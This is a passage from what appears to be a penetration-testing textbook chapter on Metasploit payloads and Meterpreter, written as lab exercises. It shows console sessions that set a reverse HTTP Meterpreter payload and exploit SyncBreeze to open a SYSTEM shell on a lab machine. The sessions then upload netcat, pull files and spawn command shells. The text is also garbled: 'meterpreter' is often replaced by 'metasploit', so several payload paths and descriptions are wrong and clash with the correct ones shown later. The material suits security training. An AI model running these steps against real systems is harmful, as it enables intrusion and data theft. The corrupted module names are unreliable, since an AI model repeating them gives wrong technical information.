
![](img/ec25e59d75726b7041242a56d3376832_686_0.png)

Note that in Metasploit, the “/” character is used to denote whether a payload is staged or not, so “shell_reverse_tcp” is not staged, whereas “shell/reverse_tcp” is.

## 22.3.2 Metasploit Payloads

As described on the Metasploit site, Metasploit Meterpreter is a multi-function payload that can be dynamically extended at run-time. In practice, this means that the Metasploit shell provides more features and functionality than a regular command shell, offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine. These tools are especially useful in the post-exploitation phase. Because of Metasploit’s flexibility and capability, it is the favorite and most commonly-used Metasploit payload.

A search for the “metasploit” keyword returns a long list of results, but narrowing the search to the payload category reveals metasploit versions for multiple operating systems and architectures including Windows, Linux, Android, Apple iOS, FreeBSD, and Apple OS X/macOS.

```
msf5 > search metasploit type:payload

Matching Modules
=================

#  Name                                        Description
-
1  payload/android/metasploit/reverse_http     Android Metasploit, Android
2  payload/android/metasploit/reverse_https    Android Metasploit, Android
3  payload/android/metasploit/reverse_tcp      Android Metasploit, Android
4  payload/android/metasploit/reverse_http     Android Metasploit Shell, R
5  payload/android/metasploit/reverse_https    Android Metasploit Shell, R
6  payload/android/metasploit/reverse_tcp      Android Metasploit Shell, R
7  payload/apple_ios/aarch64/metasploit/reverse_http    Apple iOS Metasploit, Rever
8  payload/apple_ios/aarch64/metasploit/reverse_https   Apple iOS Metasploit, Rever
9  payload/apple_ios/aarch64/metasploit/reverse_tcp     Apple iOS Metasploit, Rever
10 payload/apple_ios/armle/metasploit/reverse_http      Apple iOS Metasploit, Rever
...
```

Listing 764 - Searching for Metasploit payloads

There are a multitude of Metasploit versions based on specific programming languages (Python, PHP, Java), protocols and transports (UDP, HTTPS, IPv6, etc), and other various specifications (32-bit vs 64-bit, staged vs unstaged, etc).

For example, a small selection of Windows reverse Metasploit payloads is shown below:

```
payload/windows/metasploit/reverse_udp     normal    Reverse UDP Stager with UUID Sup
payload/windows/metasploit/reverse_http    normal    Windows Reverse HTTP Stager
payload/windows/metasploit/reverse_https   normal    Windows Reverse HTTPS Stager
payload/windows/metasploit/reverse_tcp     normal    Reverse TCP Stager (IPv6)
payload/windows/metasploit/reverse_tcp     normal    Reverse TCP Stager
```

Listing 765 - Metasploit reverse protocol versions

> [712] (Rapid7, 2017). https://github.com/rapid7/metasploit-framework/wiki/Metasploit

We can select a specific meterpreter payload with **set** and configure it just as we would a standard reverse shell payload:

```
msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http

msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 exploit(windows/http/syncbreeze_bof) > show options
...
```

Payload options (windows/meterpreter/reverse_http):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| EXITFUNC | thread | yes | Exit technique (Accepted: '', seh, thread, process, abort) |
| LHOST | 10.11.0.4 | yes | The local listener hostname |
| LPORT | 4444 | yes | The local listener port |
| LURI | / | no | The HTTP Path |

Listing 766 - Selecting meterpreter payload and configuring options

Let's try this payload against Syncbreeze. With everything configured correctly, we can launch the exploit and establish a reverse meterpreter connection:

```
msf5 exploit(windows/http/syncbreeze_bof) > exploit

[*] Started HTTP reverse handler on http://10.11.0.4:4444
[*] Automatically detecting target...
[*] Target is 10.11.0.28
[*] Sending request...
[*] http://10.11.0.4:4444 handling request from 10.11.0.22; (UUID: pwocxbzj) Staging x86
[*] Meterpreter session 1 opened (10.11.0.4:4444 -> 10.11.0.22:50270)

meterpreter >
```

Listing 767 - Establishing a reverse meterpreter connection

As demonstrated, the syntax of the meterpreter payload matches that of other payloads we have seen. Let's dig a bit further into Meterpreter to highlight some of the significant differences from standard payloads.

## 22.3.3 Experimenting with Meterpreter

We can retrieve a list of all modules and commands built-in to Meterpreter with the **help** command:

```
meterpreter > help

Core Commands
=============

Command                  Description
-------                  -----------
?                        Help menu
background               Backgrounds the current session
bkill                    Kills a background meterpreter script
bglst                    Lists running background scripts
bgrun                    Executes a meterpreter script as a background thread
channel                  Displays information or control active channels
close                    Closes a channel
disable_unicode_encoding Disables encoding of unicode strings
enable_unicode_encoding  Enables encoding of unicode strings
exit                     Terminate the meterpreter session
get_timeouts             Get the current session timeout values
guid                     Get the session GUID
.......
```

Listing 768 - Help command for Meterpreter

The best way to get to know the features of Meterpreter is to test them out. Let's start with a few simple commands such as **sysinfo** and **getuid**:

```
meterpreter > sysinfo
Computer   : CLIENT251
OS         : Windows 10 (Build 16299).
Architecture : x86
System Language : en_US
Domain     : corp
Logged On Users : 7
Meterpreter : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Listing 769 - Executing simple commands in meterpreter

The commands issued in listing 769 provide us with information about the target computer, operating system, and the current user.

Next, let's try some uploads and downloads using built-in Meterpreter commands. Take note that, due to shell escaping, we must use two `\` characters for the destination path as shown below:

```
meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
[*] uploading   :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec
[*] uploaded    :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec\nc.exe

meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
[*] Downloading: c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] Downloaded 25.50 KiB (100.0%): c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] download    : c:\Windows\system32\calc.exe -> /tmp/calc.exe
meterpreter >
```

Listing 770 - Uploading and downloading files with meterpreter

The meterpreter includes basic file system commands such as `pwd`, `ls`, and `cd` to navigate the target filesystem. Even though the commands have the same naming as those used on Linux, they work (through Metasploit) on Windows hosts as well. The biggest advantage of spawning a system shell from within Metasploit is that if, for some reason, our shell should die (e.g., we issued an interactive command within the shell and it won't time out), we can exit the shell to return to the Meterpreter session and re-spawn a shell in a new channel as illustrated in Listing 771.

```
meterpreter > shell
Process 3488 created.
Channel 3 created.

C:\Windows\system32> ftp 127.0.0.1
ftp 127.0.0.1
> ftp: connect :Connection refused
^C

Terminate channel 3? [y/N] y

meterpreter > shell
Process 3504 created.
Channel 4 created.

C:\Windows\system32> exit
exit
meterpreter >
```

Listing 771 - Using the shell command in meterpreter

While applications may be executed from within the command prompt opened with the `shell` command, there are also built-in meterpreter commands we can use. For example, the `execute` command launches an application, `ps` lists all running processes, and `kill` terminates a given process.

While Meterpreter is Metasploit's signature payload and includes many great features, it is not the only payload available. There are other payloads that have use cases in specific situations like `vncinject/reverse_http`, which creates a reverse VNC $^{713}$ graphical connection or `php/reverse.php`, which is a reverse shell written entirely in PHP that can be used to exploit a PHP web application.

More exotic payloads also exist like `mainframe/reverse_shelljcl`, which is a reverse shellcode for a Z/OS mainframe $^{714}$.

### 22.3.3.2 Exercise

- Take time to review and experiment with the various payloads available in Metasploit.

## 22.3.4 Executable Payloads

The Metasploit Framework payloads can also be exported into various file types and formats, such as ASP, VBScript, Jar, War, Windows DLL and EXE, and more.
